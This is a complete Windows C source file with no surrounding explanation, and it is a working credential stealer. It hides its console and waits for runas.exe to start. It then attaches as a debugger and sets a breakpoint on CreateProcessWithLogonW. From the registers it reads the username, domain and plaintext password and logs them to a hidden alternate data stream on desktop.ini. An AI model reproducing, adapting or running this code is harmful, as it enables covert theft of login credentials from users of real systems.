#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

#define TARGET_PROCESS_NAME L"runas.exe"
#define ORIGINAL_FILE_PATH "C:\\Users\\%USERNAME%\\Desktop\\desktop.ini"
#define ADS_NAME ":log"

LPVOID g_pCreateProcessWithLogonW = NULL;
BYTE g_originalByte = 0;

DWORD FindProcessID(const wchar_t* processName) {
    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return 0;
}

void WriteCredentialsToADS(const wchar_t* username, const wchar_t* domain, const wchar_t* password) {
    char resolvedPath[MAX_PATH];
    ExpandEnvironmentStringsA(ORIGINAL_FILE_PATH, resolvedPath, MAX_PATH);
    strcat(resolvedPath, ADS_NAME);

    FILE* file = fopen(resolvedPath, "a");
    if (!file) {
        return;
    }
    fwprintf(file, L"[+] Captured Credentials:\nUsername: %s\nDomain: %s\nPassword: %s\n\n", username, domain, password);
    fclose(file);
}

void StartDebugger(DWORD processID) {
    DEBUG_EVENT dbgEvent;
    CONTEXT context;
    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, processID);
    if (!hProcess) return;

    HMODULE hAdvapi32 = LoadLibraryW(L"advapi32.dll");
    FARPROC pFunc = GetProcAddress(hAdvapi32, "CreateProcessWithLogonW");
    g_pCreateProcessWithLogonW = (LPVOID)((DWORD_PTR)hAdvapi32 + ((DWORD_PTR)pFunc - (DWORD_PTR)hAdvapi32));

    ReadProcessMemory(hProcess, g_pCreateProcessWithLogonW, &g_originalByte, 1, NULL);
    BYTE int3 = 0xCC;
    WriteProcessMemory(hProcess, g_pCreateProcessWithLogonW, &int3, 1, NULL);
    FlushInstructionCache(hProcess, g_pCreateProcessWithLogonW, 1);

    if (!DebugActiveProcess(processID)) {
        CloseHandle(hProcess);
        return;
    }

    while (WaitForDebugEvent(&dbgEvent, INFINITE)) {
        DWORD continueStatus = DBG_CONTINUE;
        switch (dbgEvent.dwDebugEventCode) {
        case EXCEPTION_DEBUG_EVENT: {
            if (dbgEvent.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_BREAKPOINT) {
                if ((DWORD_PTR)dbgEvent.u.Exception.ExceptionRecord.ExceptionAddress == (DWORD_PTR)g_pCreateProcessWithLogonW) {
                    context.ContextFlags = CONTEXT_ALL;
                    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, dbgEvent.dwThreadId);
                    GetThreadContext(hThread, &context);

                    WCHAR username[256] = { 0 };
                    WCHAR domain[256] = { 0 };
                    WCHAR password[256] = { 0 };
                    ReadProcessMemory(hProcess, (LPCVOID)context.Rcx, username, sizeof(username), NULL);
                    ReadProcessMemory(hProcess, (LPCVOID)context.Rdx, domain, sizeof(domain), NULL);
                    ReadProcessMemory(hProcess, (LPCVOID)context.R8, password, sizeof(password), NULL);

                    WriteCredentialsToADS(username, domain, password);
                    WriteProcessMemory(hProcess, g_pCreateProcessWithLogonW, &g_originalByte, 1, NULL);
                    FlushInstructionCache(hProcess, g_pCreateProcessWithLogonW, 1);
                    context.Rip--;
                    SetThreadContext(hThread, &context);
                    CloseHandle(hThread);
                }
            }
            break;
        }
        case EXIT_PROCESS_DEBUG_EVENT:
            DebugActiveProcessStop(processID);
            CloseHandle(hProcess);
            return;
        default:
            break;
        }
        ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, continueStatus);
    }
    DebugActiveProcessStop(processID);
    CloseHandle(hProcess);
    FreeLibrary(hAdvapi32);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    FreeConsole();
    while (1) {
        DWORD pid = FindProcessID(TARGET_PROCESS_NAME);
        if (pid) {
            StartDebugger(pid);
        }
        Sleep(3000); 
    }
    return 0;
}